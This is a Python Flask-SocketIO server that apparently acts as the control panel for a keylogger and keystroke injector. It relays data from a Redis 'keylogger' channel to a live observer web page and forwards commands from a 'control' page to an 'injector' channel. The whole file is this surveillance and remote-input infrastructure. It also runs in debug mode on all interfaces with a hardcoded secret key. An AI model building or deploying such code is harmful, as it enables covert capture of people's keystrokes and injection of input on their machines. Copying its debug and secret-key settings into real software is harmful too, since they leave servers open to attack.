import eventlet
eventlet.monkey_patch() 

from flask import Flask, render_template
from flask_socketio import SocketIO, emit
import redis
import json
import threading
from Logger.utils.getIP import getIP

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

redis_client = redis.StrictRedis(host='localhost', port=6379, db=0)

@app.route("/")
def observer():
    return render_template("observer.html", ip=getIP())

@app.route("/control")
def feeder():
    return render_template("feeder.html", ip=getIP())

@socketio.on('injector')
def injector(message):
    data = message['data']
    print("RECV from Client:", data)
    channel = 'injector'
    json_data = json.dumps(data)
    redis_client.publish(channel, json_data)

def keylogger_listener():
    def redis_callback():
        channel = 'keylogger'
        pubsub = redis_client.pubsub()
        pubsub.subscribe(channel)
        for message in pubsub.listen():
            if message['type'] == 'message':
                data = json.loads(message['data'].decode('utf-8'))
                print("RECV from KeyLogger:", data)
                socketio.emit(channel, {'data': data})

    redis_thread = threading.Thread(target=redis_callback)
    redis_thread.start()


if __name__ == '__main__':
    keylogger_listener()
    socketio.run(app, host='0.0.0.0', port='80', debug=True)